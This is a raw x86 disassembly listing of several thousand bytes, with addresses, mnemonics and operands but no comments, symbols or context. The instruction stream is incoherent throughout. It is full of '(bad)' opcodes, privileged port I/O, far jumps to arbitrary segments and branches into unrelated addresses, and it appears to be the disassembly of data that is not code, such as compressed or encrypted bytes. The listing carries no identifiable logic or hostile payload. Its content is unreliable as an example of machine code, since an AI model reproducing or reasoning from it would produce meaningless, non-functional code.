  42457c:	test   al,0x5f
  42457e:	test   DWORD PTR [edi+eax*8+0x546baab7],esp
  424585:	pusha  
  424586:	arpl   WORD PTR [eax],cx
  424588:	or     al,0xa6
  42458a:	addr16 cdq 
  42458c:	icebp  
  42458d:	imul   ecx,DWORD PTR [esi-0x5d],0x63
  424591:	emms   
  424593:	(bad)  
  424595:	mov    ds:0xd9a8465,eax
  42459a:	mov    bl,dl
  42459c:	push   edx
  42459d:	pop    edx
  42459e:	fwait
  42459f:	lods   al,BYTE PTR ds:[esi]
  4245a0:	mov    es,WORD PTR [esi]
  4245a2:	pop    edx
  4245a3:	cmp    bl,BYTE PTR [edi-0x2b5e362c]
  4245a9:	jl     0x424543
  4245ab:	lods   eax,DWORD PTR ds:[esi]
  4245ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245ae:	es jb  0x424580
  4245b1:	xchg   DWORD PTR [ebp-0xc],edx
  4245b4:	pop    edi
  4245b5:	shl    DWORD PTR [eax-0x9],1
  4245b8:	fs getsec 
  4245bb:	in     al,0x42
  4245bd:	iret   
  4245be:	cmp    al,0xa6
  4245c0:	out    dx,al
  4245c1:	loope  0x4245e7
  4245c3:	sbb    eax,0xa73ac7fe
  4245c8:	mov    ecx,0x1591f298
  4245cd:	loopne 0x42456c
  4245cf:	ins    BYTE PTR es:[edi],dx
  4245d0:	cmp    dh,BYTE PTR [eax-0x4e]
  4245d3:	fisub  WORD PTR [eax+0x1b9b6096]
  4245d9:	jno    0x42458d
  4245db:	ret    
  4245dc:	sar    bl,cl
  4245de:	sub    BYTE PTR [esi],al
  4245e0:	retf   
  4245e1:	mov    esp,0x2b300f53
  4245e6:	cld    
  4245e7:	cmp    DWORD PTR [ebx+ecx*1-0x6dddd91d],ecx
  4245ee:	es ret 0x8df9
  4245f2:	inc    eax
  4245f3:	clc    
  4245f4:	push   esp
  4245f5:	pop    edx
  4245f6:	pop    ss
  4245f7:	pop    edx
  4245f8:	mov    ebx,0xec288ab0
  4245fd:	out    dx,eax
  4245fe:	mov    eax,ds:0xc02baa7
  424603:	jns    0x42462b
  424605:	retf   
  424606:	cld    
  424607:	test   ch,al
  424609:	mov    edi,0xda478da4
  42460e:	or     DWORD PTR [ebp+ebp*4-0x6b321fb4],ebx
  424615:	fild   DWORD PTR [ebp-0x27]
  424618:	xor    bl,BYTE PTR ds:0xaabe70f8
  42461e:	push   ds
  42461f:	cwde   
  424620:	fs and ebx,0x39d081f9
  424627:	mov    al,ds:0x51988451
  42462c:	dec    ebx
  42462d:	jmp    0x2352f869
  424632:	push   ebx
  424633:	leave  
  424634:	gs jo  0x4245e2
  424637:	imul   edx,DWORD PTR [edx],0xffffffd2
  42463a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42463b:	aas    
  42463c:	inc    esp
  42463d:	cli    
  42463e:	int    0xca
  424640:	imul   dl
  424642:	mov    esi,0xa894aba3
  424647:	fisubr WORD PTR [esi]
  424649:	add    ch,BYTE PTR [edx-0x7d]
  42464c:	int3   
  42464d:	and    al,0x25
  42464f:	loop   0x424672
  424651:	jo     0x424629
  424653:	mov    al,ah
  424655:	inc    ecx
  424656:	(bad)  
  424658:	icebp  
  424659:	rcl    DWORD PTR [esi],0x19
  42465c:	dec    ebp
  42465d:	dec    edx
  42465e:	jle    0x424611
  424660:	stos   DWORD PTR es:[edi],eax
  424661:	gs dec esp
  424663:	and    al,0xaf
  424665:	jb     0x424631
  424667:	cmp    al,0x22
  424669:	das    
  42466a:	add    al,BYTE PTR [eax+eax*1+0x640ee5f4]
  424671:	cdq    
  424672:	jp     0x424611
  424674:	adc    DWORD PTR [eax+0xb62dfc5],0xaceaf0f4
  42467e:	int3   
  42467f:	sub    esi,esi
  424681:	mov    ebx,0x9cf60ae6
  424686:	xchg   BYTE PTR [edx+0xa],al
  424689:	sub    edi,DWORD PTR ds:0x2935f07a
  42468f:	cli    
  424690:	or     DWORD PTR [edi*8-0x4be44a4c],edx
  424697:	repnz pop es
  424699:	jge    0x42464f
  42469b:	add    al,0x85
  42469d:	stc    
  42469e:	je     0x424644
  4246a0:	inc    edi
  4246a1:	cmp    eax,0xa5e41262
  4246a6:	rol    BYTE PTR [esi+eiz*4],0xb4
  4246aa:	retf   
  4246ab:	or     eax,0xc8819e0d
  4246b0:	test   DWORD PTR [edx+0x2e],ebx
  4246b3:	adc    cl,bl
  4246b5:	pusha  
  4246b6:	push   ecx
  4246b7:	dec    ebx
  4246b8:	ins    DWORD PTR es:[edi],dx
  4246b9:	inc    ebx
  4246ba:	xor    BYTE PTR [ebx-0x7949216c],bh
  4246c0:	xchg   edi,eax
  4246c1:	call   0x734e8cc6
  4246c6:	xchg   edx,eax
  4246c7:	and    al,0xfc
  4246c9:	adc    eax,0x1792233a
  4246ce:	or     dh,ah
  4246d0:	jge    0x4246f2
  4246d2:	sbb    BYTE PTR [esi],al
  4246d4:	scas   eax,DWORD PTR es:[edi]
  4246d5:	push   ss
  4246d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4246d7:	or     dh,BYTE PTR [edx+0x172fce1b]
  4246dd:	sub    eax,0x764d5d9c
  4246e2:	sbb    al,BYTE PTR [eax-0x466649b8]
  4246e8:	xchg   edx,eax
  4246e9:	push   ebp
  4246ea:	scas   ax,WORD PTR es:[edi]
  4246ec:	fcom   DWORD PTR [esi+0x5ca4344d]
  4246f2:	xor    bh,ah
  4246f4:	jmp    0xa450:0x7bc00704
  4246fb:	dec    edx
  4246fc:	lahf   
  4246fd:	xchg   edx,eax
  4246fe:	jns    0x4246d4
  424700:	fiadd  DWORD PTR [eax-0x7722e9d8]
  424706:	or     esi,ecx
  424708:	std    
  424709:	retf   0x7f9f
  42470c:	add    DWORD PTR [esi+edi*2+0x5ff6f62d],ebx
  424713:	test   eax,0x809b9146
  424718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424719:	imul   BYTE PTR [ebp-0x41]
  42471c:	xor    DWORD PTR [edx+0x67],esp
  42471f:	sub    ax,0x1c6a
  424723:	mov    ebp,0xef75cec2
  424728:	pop    esp
  424729:	fnsave [eax+0x2947546f]
  42472f:	dec    eax
  424730:	sbb    dh,BYTE PTR [eax-0x21cf7488]
  424736:	scas   al,BYTE PTR es:[edi]
  424737:	dec    esp
  424738:	icebp  
  424739:	add    al,0x58
  42473b:	ret    
  42473c:	test   BYTE PTR [ebx],ch
  42473e:	outs   dx,BYTE PTR ds:[esi]
  42473f:	adc    ebx,DWORD PTR [eax-0x316ca1ea]
  424745:	addr16 jns 0x4246db
  424748:	in     al,dx
  424749:	pop    ss
  42474a:	pushf  
  42474b:	and    al,0x6c
  42474d:	test   BYTE PTR [eiz*4-0x22aeac42],bl
  424754:	ins    BYTE PTR es:[edi],dx
  424755:	mov    esp,0x80c4cd7
  42475a:	sbb    al,0xab
  42475c:	xor    bh,BYTE PTR [eax]
  42475e:	adc    BYTE PTR [esi+0x4c],0x12
  424762:	in     eax,dx
  424763:	sti    
  424764:	mov    edi,0xccba6a29
  424769:	jg     0x424747
  42476b:	adc    DWORD PTR [ebx-0x7dfd093],eax
  424771:	cld    
  424772:	das    
  424773:	rol    DWORD PTR [ebx+0x42],1
  424776:	repnz outs dx,DWORD PTR ds:[esi]
  424778:	cmp    ecx,DWORD PTR [eax]
  42477a:	sub    ebx,edi
  42477c:	outs   dx,DWORD PTR ds:[esi]
  42477d:	adc    BYTE PTR [edx+0x14],0xe8
  424781:	push   eax
  424782:	call   0x3c28dad2
  424787:	push   cs
  424788:	aas    
  424789:	jp     0x42476f
  42478b:	pop    ds
  42478c:	repnz in eax,dx
  42478e:	push   esi
  42478f:	repnz xchg edx,eax
  424791:	pusha  
  424792:	lods   al,BYTE PTR ds:[esi]
  424793:	pop    esi
  424794:	test   BYTE PTR [ebx+0x7f],cl
  424797:	mov    ebp,0x93a41fef
  42479c:	dec    esi
  42479d:	pop    ecx
  42479e:	push   0x4e
  4247a0:	xchg   edi,eax
  4247a1:	es adc esi,ecx
  4247a4:	retf   
  4247a5:	or     bl,ah
  4247a7:	mov    bl,BYTE PTR [esi-0x762ff7e0]
  4247ad:	das    
  4247ae:	mov    esp,0xbc4ef8e3
  4247b3:	adc    al,0x30
  4247b5:	adc    esp,DWORD PTR [ebx+0x4779df81]
  4247bb:	js     0x424809
  4247bd:	cdq    
  4247be:	fdiv   QWORD PTR ds:0x39422e7f
  4247c4:	inc    edi
  4247c5:	test   al,0x3c
  4247c7:	adc    eax,0x116f62e2
  4247cc:	idiv   ebp
  4247ce:	and    edi,DWORD PTR [ecx-0x693f9e32]
  4247d4:	jg     0x42483e
  4247d6:	(bad)  
  4247d7:	in     eax,0x43
  4247d9:	jo     0x4247af
  4247db:	add    al,0x13
  4247dd:	ins    BYTE PTR es:[edi],dx
  4247de:	lahf   
  4247df:	cmp    eax,0xc73fb627
  4247e4:	adc    ah,BYTE PTR [eax-0x3802363e]
  4247ea:	(bad)  
  4247eb:	jecxz  0x424808
  4247ed:	retf   0x6eb
  4247f0:	sub    DWORD PTR [ecx],0xef27c0c7
  4247f6:	lds    ecx,FWORD PTR [esi-0x78a1d59c]
  4247fc:	call   0x6e:0xf36c91bc
  424803:	xor    BYTE PTR ds:0x1caa3744,bh
  424809:	mov    ds:0xc6565950,eax
  42480e:	outs   dx,BYTE PTR ds:[esi]
  42480f:	ss in  al,dx
  424811:	repz jg 0x424841
  424814:	ja     0x4247e4
  424816:	mov    cl,0xb6
  424818:	inc    eax
  424819:	test   eax,0x3000396c
  42481e:	ret    
  42481f:	xchg   ecx,eax
  424820:	inc    edx
  424821:	and    al,0xef
  424823:	inc    ecx
  424824:	xor    eax,DWORD PTR ds:0xaeef7459
  42482a:	jmp    0xe31d:0xbd4e340
  424831:	mov    DWORD PTR [ebp-0x6d],edi
  424834:	loop   0x42480d
  424836:	or     eax,0xe429bc83
  42483b:	mov    al,0xc8
  42483d:	and    DWORD PTR [edx-0x4d],ebp
  424840:	mov    al,0x7f
  424842:	imul   ecx,DWORD PTR ds:[edx],0xc04b5d48
  424849:	cld    
  42484a:	stos   DWORD PTR es:[edi],eax
  42484b:	mov    gs,WORD PTR [edi+0x4d]
  42484e:	and    ecx,0x4e
  424851:	xlat   BYTE PTR ds:[ebx]
  424852:	mov    ebp,DWORD PTR [edi-0x4d]
  424855:	enter  0xe6fe,0xdb
  424859:	scas   eax,DWORD PTR es:[edi]
  42485a:	rcl    DWORD PTR [ebp+0x2d0cf2bf],1
  424860:	stc    
  424861:	pop    edi
  424862:	std    
  424863:	mov    ecx,0xd901720c
  424868:	sbb    al,0x90
  42486a:	inc    esp
  42486b:	clc    
  42486c:	inc    ebp
  42486d:	scas   eax,DWORD PTR es:[edi]
  42486e:	xor    ebx,DWORD PTR [ebx+0x4b]
  424871:	pushf  
  424872:	outs   dx,DWORD PTR ds:[esi]
  424873:	jecxz  0x4247f6
  424875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424876:	sti    
  424877:	out    0x35,al
  424879:	pushfw 
  42487b:	and    BYTE PTR [edx-0x19a2ed59],ah
  424881:	dec    esi
  424882:	pushf  
  424883:	mov    dh,BYTE PTR [ebx-0x48e54d6a]
  424889:	sub    eax,0x3eab90a9
  42488e:	mov    edi,ebp
  424890:	ins    BYTE PTR es:[edi],dx
  424891:	fisubr WORD PTR [ebx-0x47]
  424894:	leave  
  424895:	dec    esi
  424896:	push   0xffffffbe
  424898:	pop    esp
  424899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42489a:	test   eax,0xc6903266
  42489f:	push   es
  4248a0:	lods   al,BYTE PTR ds:[esi]
  4248a1:	popa   
  4248a2:	fs inc ebp
  4248a4:	dec    edx
  4248a5:	dec    edx
  4248a6:	out    0xf1,eax
  4248a8:	inc    esi
  4248a9:	xchg   ebp,eax
  4248aa:	pop    edi
  4248ab:	fstp   TBYTE PTR [ecx]
  4248ad:	mov    edx,0xdb79e4f6
  4248b2:	inc    edx
  4248b3:	shr    DWORD PTR fs:[ecx],0xe1
  4248b7:	xchg   ecx,eax
  4248b8:	dec    ebp
  4248b9:	ror    DWORD PTR [edi-0x25],1
  4248bc:	(bad)  
  4248bd:	cmp    esi,DWORD PTR [ebx+ebx*2]
  4248c0:	inc    esi
  4248c1:	idiv   BYTE PTR [edx]
  4248c3:	into   
  4248c4:	pop    ss
  4248c5:	sar    BYTE PTR [eax+esi*1],1
  4248c8:	inc    esp
  4248c9:	mov    bl,0xb2
  4248cb:	loopne 0x42491b
  4248cd:	or     DWORD PTR [eax],ebx
  4248cf:	inc    edi
  4248d0:	mov    eax,0x982653bf
  4248d5:	pop    ss
  4248d6:	bound  eax,QWORD PTR [ebp+0x76]
  4248d9:	pop    edx
  4248da:	bound  esp,QWORD PTR [esi+0x333daffb]
  4248e0:	mov    ds:0x783aa8c5,al
  4248e5:	jmp    DWORD PTR [edi+0x5d]
  4248e8:	mov    ah,0xb5
  4248ea:	fisttp DWORD PTR [eax]
  4248ec:	cdq    
  4248ed:	arpl   WORD PTR [ecx+ecx*2-0x39],cx
  4248f1:	jno    0x4248be
  4248f3:	xor    eax,0x282430fe
  4248f8:	(bad)  
  4248f9:	call   0xf023:0x2379ac5c
  424900:	push   ebx
  424901:	adc    bh,BYTE PTR [ecx-0x69]
  424904:	xchg   esp,eax
  424905:	cmp    DWORD PTR [edi-0x19b45471],eax
  42490b:	es (bad) 
  42490d:	xchg   edx,eax
  42490e:	jl     0x42492f
  424910:	adc    DWORD PTR [edi],ebx
  424912:	ficom  DWORD PTR [eax+0xc]
  424915:	cld    
  424916:	dec    edx
  424917:	or     eax,0xddccc760
  42491c:	lods   al,BYTE PTR ds:[esi]
  42491d:	fidivr WORD PTR [esi-0x2efa28dd]
  424923:	pop    edi
  424924:	scas   al,BYTE PTR es:[edi]
  424925:	sub    BYTE PTR [ebx+0x34],ch
  424928:	xchg   BYTE PTR [edx],cl
  42492a:	sbb    cl,bh
  42492c:	add    eax,edi
  42492e:	cdq    
  42492f:	or     DWORD PTR [esi+0x2bbd82cf],0x5326df52
  424939:	pop    edx
  42493a:	scas   eax,DWORD PTR es:[edi]
  42493b:	fs push edx
  42493d:	loope  0x424912
  42493f:	ja     0x42494f
  424941:	das    
  424942:	inc    eax
  424943:	sti    
  424944:	iret   
  424945:	adc    al,0x1c
  424947:	jmp    0x6bc3:0x4e758d80
  42494e:	push   edi
  42494f:	jno    0x4248e7
  424951:	retf   0xbb2
  424954:	mov    eax,0xcadf75b5
  424959:	test   BYTE PTR [ebp-0x44],al
  42495c:	aas    
  42495d:	dec    edx
  42495e:	xchg   edi,eax
  42495f:	and    BYTE PTR [ebx-0x3a],ah
  424962:	loop   0x424932
  424964:	xchg   esp,eax
  424965:	xor    esp,DWORD PTR [ebx+0x46bd6a72]
  42496b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42496c:	mov    al,0x7f
  42496e:	sub    BYTE PTR [esi],bl
  424970:	xor    al,dl
  424972:	leave  
  424973:	push   ds
  424974:	adc    eax,0xd4407174
  424979:	in     al,dx
  42497a:	inc    ebx
  42497b:	pop    ds
  42497c:	fisubr DWORD PTR [ecx+esi*2-0x5d]
  424980:	shr    edi,0xd6
  424983:	jecxz  0x424983
  424985:	mov    eax,0x5fa38732
  42498a:	loope  0x424a07
  42498c:	test   DWORD PTR [ebx],edi
  42498e:	ds jno 0x424997
  424991:	xchg   esi,eax
  424992:	mov    ecx,DWORD PTR [edx]
  424994:	push   es
  424995:	mov    edx,0x2c5464e7
  42499a:	sub    BYTE PTR [eax+0x47],bh
  42499d:	ja     0x424950
  42499f:	js     0x424929
  4249a1:	rol    cl,cl
  4249a3:	or     eax,0x55781373
  4249a8:	lods   eax,DWORD PTR ds:[esi]
  4249a9:	cmp    esp,DWORD PTR [esi]
  4249ab:	cmp    eax,0xa143f57b
  4249b0:	fidiv  WORD PTR [ecx]
  4249b2:	cmp    ah,cl
  4249b4:	(bad)  
  4249b5:	xor    DWORD PTR [esi+0x35],eax
  4249b8:	jae    0x424941
  4249ba:	cmp    DWORD PTR [ecx-0x2c],eax
  4249bd:	pop    eax
  4249be:	push   ds
  4249bf:	test   al,0xd7
  4249c1:	ror    BYTE PTR [ebx],0xaf
  4249c4:	jb     0x424a01
  4249c6:	and    BYTE PTR [edi-0x63074e87],bh
  4249cc:	push   eax
  4249cd:	aad    0xae
  4249cf:	mov    eax,ds:0xdeb1d37c
  4249d4:	(bad)  
  4249d5:	mov    dh,0xb4
  4249d7:	sbb    al,ch
  4249d9:	mov    bh,0xf8
  4249db:	inc    esp
  4249dc:	fs hlt 
  4249de:	xor    eax,edi
  4249e0:	fwait
  4249e1:	pop    es
  4249e2:	jge    0x4249a5
  4249e4:	in     eax,0x26
  4249e6:	dec    ebp
  4249e7:	inc    esp
  4249e8:	ror    DWORD PTR [edx-0x3b],0xb5
  4249ec:	push   esi
  4249ed:	retf   0xfafc
  4249f0:	ins    DWORD PTR es:[edi],dx
  4249f1:	jbe    0x4249fc
  4249f3:	adc    al,0xc1
  4249f5:	jge    0x424987
  4249f7:	sub    esi,DWORD PTR [eax-0x17]
  4249fa:	xchg   ecx,eax
  4249fb:	mov    cl,0x46
  4249fd:	push   esi
  4249fe:	into   
  4249ff:	and    DWORD PTR [ebx+0x3c],esp
  424a02:	jg     0x424a08
  424a04:	daa    
  424a05:	mov    al,0x15
  424a07:	or     DWORD PTR [ebx+ebp*8+0x42],0xffffffe0
  424a0c:	or     eax,0x72a754e8
  424a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a12:	(bad)  
  424a13:	arpl   WORD PTR [esi],bp
  424a15:	mov    BYTE PTR ds:0xeaaddd2a,dl
  424a1c:	mov    dh,0xa6
  424a1e:	jns    0x7fb41998
  424a24:	int3   
  424a25:	adc    DWORD PTR [ebx-0x64a81216],edi
  424a2b:	push   eax
  424a2c:	or     DWORD PTR [ecx],ebx
  424a2e:	cld    
  424a2f:	outs   dx,DWORD PTR ds:[esi]
  424a30:	cmp    BYTE PTR [ebp-0x7b5bcdd8],bh
  424a36:	sub    BYTE PTR [edi+0x42],dh
  424a39:	arpl   cx,sp
  424a3b:	scas   al,BYTE PTR es:[edi]
  424a3c:	jmp    0x7da6bd1e
  424a41:	frstor [ecx+0x35]
  424a44:	(bad)  
  424a45:	fisttp QWORD PTR [ebx]
  424a47:	(bad)  
  424a49:	int3   
  424a4a:	inc    eax
  424a4b:	push   edx
  424a4c:	xor    eax,0x3f4d7b8
  424a51:	cmp    eax,0x5757017a
  424a56:	push   ds
  424a57:	(bad)  [eax]
  424a59:	inc    eax
  424a5a:	sub    BYTE PTR ds:0xcc6a1a59,0x43
  424a61:	and    al,0x33
  424a63:	fwait
  424a64:	fs test eax,0x82c2
  424a6a:	push   edx
  424a6b:	inc    ecx
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	xlat   BYTE PTR ds:[ebx]
  424a77:	mov    bl,0x83
  424a79:	jnp    0x424a1f
  424a7b:	fadd   DWORD PTR [ecx]
  424a7d:	add    BYTE PTR [esi-0x19fffffa],al
  424a83:	mov    ds:0xd9af4b11,al
  424a88:	jno    0x424afe
  424a8a:	mov    esp,esp
  424a8c:	jge    0x424a59
  424a8e:	in     al,0xd6
  424a90:	stos   BYTE PTR es:[edi],al
  424a91:	std    
  424a92:	shr    BYTE PTR [esi+0x512fd645],cl
  424a98:	inc    ebp
  424a99:	jmp    0x9ddb:0xc0abf97d
  424aa0:	mov    bh,0xb3
  424aa2:	jno    0x424ab7
  424aa4:	pop    edi
  424aa5:	mov    bh,0x9c
  424aa7:	add    BYTE PTR [ecx+0xa],0xdb
  424aab:	jnp    0x424b27
  424aad:	lods   eax,DWORD PTR ds:[esi]
  424aae:	inc    edx
  424aaf:	push   ds
  424ab0:	inc    ecx
  424ab1:	leave  
  424ab2:	iret   
  424ab3:	ds mov ebp,0x5fd87733
  424ab9:	cmp    edi,DWORD PTR [edx-0x1d736452]
  424abf:	jnp    0x424acd
  424ac1:	dec    edx
  424ac2:	fs stos DWORD PTR es:[edi],eax
  424ac4:	xchg   ecx,esp
  424ac6:	xor    al,0x8c
  424ac8:	push   es
  424ac9:	mov    ch,0xad
  424acb:	mov    gs,ebx
  424acd:	pop    ebx
  424ace:	xchg   esp,eax
  424acf:	mov    ?,WORD PTR [edx+0x5e]
  424ad2:	sub    eax,DWORD PTR cs:[edx+0xa]
  424ad6:	dec    esp
  424ad7:	adc    ah,BYTE PTR [esi-0x4d]
  424ada:	cmp    ebx,DWORD PTR [eax-0x26]
  424add:	mov    bh,bl
  424adf:	ss pop ecx
  424ae1:	mov    ecx,cs
  424ae3:	rcl    BYTE PTR [eax],cl
  424ae5:	outs   dx,BYTE PTR ds:[esi]
  424ae6:	sub    BYTE PTR [edx],cl
  424ae8:	and    BYTE PTR [edi+eax*8+0x3b6a76b8],al
  424aef:	std    
  424af0:	leave  
  424af1:	and    al,0x87
  424af3:	mov    ds,WORD PTR [esi+0xc3ca010]
  424af9:	(bad)  
  424afa:	sub    eax,0xfab65012
  424aff:	mov    WORD PTR ds:[ecx],cs
  424b02:	sub    edi,ebx
  424b04:	mov    bh,0xe6
  424b06:	mov    ch,0x68
  424b08:	stos   DWORD PTR es:[edi],eax
  424b09:	enter  0x12fc,0x85
  424b0d:	daa    
  424b0e:	mov    ch,BYTE PTR [edi+0x3191bd73]
  424b14:	(bad)  
  424b15:	rep stos DWORD PTR es:[edi],eax
  424b17:	adc    ch,BYTE PTR [eax-0x66]
  424b1a:	pop    ecx
  424b1b:	bound  eax,QWORD PTR [eax-0x53]
  424b1e:	mov    eax,ds:0x98b6bd4a
  424b23:	dec    ecx
  424b24:	mov    cl,0xe
  424b26:	popf   
  424b27:	(bad)  
  424b28:	dec    ebx
  424b29:	push   ecx
  424b2a:	retf   
  424b2b:	jae    0x424b16
  424b2d:	fwait
  424b2e:	mov    eax,0x627de94c
  424b33:	adc    esi,edx
  424b35:	sbb    al,0x46
  424b37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b38:	sbb    ah,BYTE PTR [edx+ecx*1-0x4c]
  424b3c:	aam    0xb
  424b3e:	dec    edi
  424b3f:	loop   0x424ba3
  424b41:	test   eax,0xa49232ed
  424b46:	push   edi
  424b47:	call   0x1b43:0x476c84d1
  424b4e:	lods   eax,DWORD PTR ds:[esi]
  424b4f:	mov    dl,0xf5
  424b51:	adc    esi,DWORD PTR [ecx-0xb]
  424b54:	fdivr  DWORD PTR [ecx]
  424b56:	add    al,BYTE PTR [esi+0x52e513d4]
  424b5c:	xchg   ebp,eax
  424b5d:	sub    bl,BYTE PTR [esi]
  424b5f:	and    edi,ebp
  424b61:	push   esi
  424b62:	and    ebx,0x59
  424b65:	js     0x424bde
  424b67:	les    ecx,FWORD PTR [ecx-0x109f483f]
  424b6d:	mov    ebx,0x1e0a82f
  424b72:	pop    ebx
  424b73:	jge    0x424bd4
  424b75:	jnp    0x424b69
  424b77:	push   cs
  424b78:	xor    DWORD PTR [esi],ecx
  424b7a:	xchg   esi,eax
  424b7b:	xor    DWORD PTR [edx+0x31],esp
  424b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b7f:	das    
  424b80:	xor    ch,bh
  424b82:	sbb    bl,cl
  424b84:	cmc    
  424b85:	cmc    
  424b86:	jne    0x424b4f
  424b88:	adc    DWORD PTR [edx+0x182dd57b],0x13
  424b8f:	dec    ecx
  424b90:	xchg   edx,eax
  424b91:	xchg   edi,eax
  424b92:	sbb    eax,0x6b28938f
  424b97:	aas    
  424b98:	cmp    esi,DWORD PTR [ecx+0x58]
  424b9b:	inc    edi
  424b9c:	fadd   QWORD PTR [eax-0x5e]
  424b9f:	and    dh,ah
  424ba1:	ret    
  424ba2:	add    al,0x7d
  424ba4:	loopne 0x424bad
  424ba6:	aam    0x9d
  424ba8:	dec    esi
  424ba9:	addr16 mov esi,0x1703be8e
  424baf:	pop    esp
  424bb0:	sbb    al,0xcb
  424bb2:	adc    DWORD PTR [edx-0x4e439f17],ecx
  424bb8:	jecxz  0x424be6
  424bba:	clc    
  424bbb:	pop    edi
  424bbc:	ss pop esp
  424bbe:	jb     0x424ba4
  424bc0:	loope  0x424be4
  424bc2:	in     al,0xf3
  424bc4:	ret    0x704
  424bc7:	xchg   ecx,eax
  424bc8:	mov    eax,ds:0x82b695f0
  424bcd:	outs   dx,DWORD PTR ds:[esi]
  424bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424bcf:	dec    esi
  424bd0:	loope  0x424bd7
  424bd2:	mov    bl,BYTE PTR [edx+0x3237a82]
  424bd8:	xchg   DWORD PTR [edx+0x61c4dbb8],esi
  424bde:	in     al,dx
  424bdf:	cmc    
  424be0:	pop    es
  424be1:	push   0xfab8d215
  424be6:	js     0x424bfb
  424be8:	ins    BYTE PTR es:[edi],dx
  424be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424bea:	pop    ecx
  424beb:	les    esi,FWORD PTR ds:0x4344dd7f
  424bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424bf2:	jp     0x424c34
  424bf4:	out    0x45,al
  424bf6:	fimul  WORD PTR [eax]
  424bf8:	mov    ds:0x841ef54,eax
  424bfd:	push   ss
  424bfe:	shl    BYTE PTR [ebp-0x13908c5b],0x48
  424c05:	jo     0x424c3c
  424c07:	das    
  424c08:	lds    esp,FWORD PTR [ebp+0x8]
  424c0b:	xchg   BYTE PTR [esi-0x51d7654c],al
  424c11:	lea    ecx,[ebp-0x6e]
  424c14:	cmp    DWORD PTR [edx+0x13],ecx
  424c17:	and    BYTE PTR [ebp+0x6cfd4f6c],0x83
  424c1e:	mov    esi,0x24022562
  424c23:	or     dl,dl
  424c25:	pushf  
  424c26:	call   0x327b:0x1a829fdc
  424c2d:	sub    esp,ebp
  424c2f:	mov    ah,0x18
  424c31:	or     al,0x7a
  424c33:	(bad)  
  424c34:	mov    eax,0x6523eb00
  424c39:	call   FWORD PTR [ecx-0x6f]
  424c3c:	and    eax,0x4553918d
  424c41:	fisttp WORD PTR [esi+0x2c]
  424c44:	es cmp ecx,edx
  424c47:	add    al,ah
  424c49:	ins    DWORD PTR es:[edi],dx
  424c4a:	add    ch,0x78
  424c4d:	shl    bl,0x51
  424c50:	retf   
  424c51:	and    eax,0xf2c3802d
  424c56:	sbb    DWORD PTR [ebx-0x616faa2f],ecx
  424c5c:	iret   
  424c5d:	test   eax,0xa552d183
  424c62:	fld    TBYTE PTR [edi-0x64]
  424c65:	imul   edx,DWORD PTR [ebp-0x6db66553],0x1f
  424c6c:	jmp    0x8bd3:0xdf4784c6
  424c73:	mov    ch,0x1e
  424c75:	out    dx,eax
  424c76:	lock jne 0x424c2f
  424c79:	mov    edi,0x3ec8195d
  424c7e:	out    0x3d,al
  424c80:	iret   
  424c81:	loop   0x424cc3
  424c83:	sti    
  424c84:	repz dec eax
  424c86:	fbld   TBYTE PTR [esi]
  424c88:	push   esp
  424c89:	push   ds
  424c8a:	pop    ds
  424c8b:	sbb    ch,ch
  424c8d:	std    
  424c8e:	or     BYTE PTR [eax-0x40fd97d4],al
  424c94:	scas   eax,DWORD PTR es:[edi]
  424c95:	je     0x424c23
  424c97:	pusha  
  424c98:	and    eax,0xf98300c6
  424c9d:	pop    eax
  424c9e:	test   DWORD PTR [edi+edx*4],eax
  424ca1:	adc    bl,BYTE PTR [edi-0x4d]
  424ca4:	mov    edx,0x400d9e28
  424ca9:	mov    BYTE PTR [ebx+0xd3a7c25],dh
  424caf:	inc    esi
  424cb0:	ja     0x424c93
  424cb2:	ja     0x424c6a
  424cb4:	cmp    BYTE PTR [esi-0x27adedb9],al
  424cba:	clc    
  424cbb:	cmc    
  424cbc:	sub    al,0xd1
  424cbe:	ins    DWORD PTR es:[edi],dx
  424cbf:	add    al,0xa5
  424cc1:	pushf  
  424cc2:	ret    0x4010
  424cc5:	test   DWORD PTR [esp+esi*8-0x2e],esp
  424cc9:	or     BYTE PTR cs:[edx-0x6c4d161f],ch
  424cd0:	dec    eax
  424cd1:	js     0x424d14
  424cd3:	or     bh,BYTE PTR [ebx-0x2a]
  424cd6:	inc    esp
  424cd7:	adc    bh,BYTE PTR [edi-0x54]
  424cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424cdb:	or     al,dh
  424cdd:	loope  0x424cf1
  424cdf:	fisub  WORD PTR [ecx+0x3d399135]
  424ce5:	out    0xa3,al
  424ce7:	aas    
  424ce8:	lahf   
  424ce9:	or     DWORD PTR [esi-0x79],0xfc9eac04
  424cf0:	mov    esp,DWORD PTR [edx]
  424cf2:	sub    eax,0x2f85c2a
  424cf7:	mul    DWORD PTR [ebp-0x46]
  424cfa:	and    edx,ebx
  424cfc:	or     DWORD PTR gs:[esi+0x669b39d5],edx
  424d03:	push   esi
  424d04:	sti    
  424d05:	and    al,0x6a
  424d07:	out    0xa3,eax
  424d09:	mov    eax,DWORD PTR [esi+0x102fdfca]
  424d0f:	sbb    al,0xb3
  424d11:	inc    ecx
  424d12:	pop    ds
  424d13:	cmc    
  424d14:	(bad)  
  424d16:	fadd   st,st(0)
  424d18:	jnp    0x424ce2
  424d1a:	xor    ebp,eax
  424d1c:	shr    DWORD PTR [ebx+0x6f55dd79],1
  424d22:	repz cmp dl,BYTE PTR [ebp-0xe]
  424d26:	sbb    BYTE PTR [ebx],al
  424d28:	mov    ds:0x2ea12b8f,al
